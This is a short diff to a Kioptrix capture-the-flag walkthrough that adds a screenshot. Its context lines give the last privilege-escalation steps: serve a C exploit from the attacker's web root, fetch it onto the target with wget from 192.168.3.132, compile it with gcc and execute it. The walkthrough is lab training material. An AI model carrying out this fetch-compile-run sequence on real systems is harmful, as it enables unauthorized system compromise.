@@ -34,4 +34,6 @@ this Kioptrix VM Image is an easy challenge. The object of the game is to acquir
 ### Now move the exploit file  to  **/var/www/html/** to be downloaded on the machine using this command ****wget http://192.168.3.132****
 ### at the next step to run the **C** exploit file using **gcc compiler** with this command **gcc k.c** and the output is **a.out** file  
 ### The last step is to Execute the output file with this command : **./a.out** . 
+![11](https://user-images.githubusercontent.com/58820314/112987084-9a828680-9162-11eb-9cb2-c63ae340e5f4.png)
+
 # Best of luck #
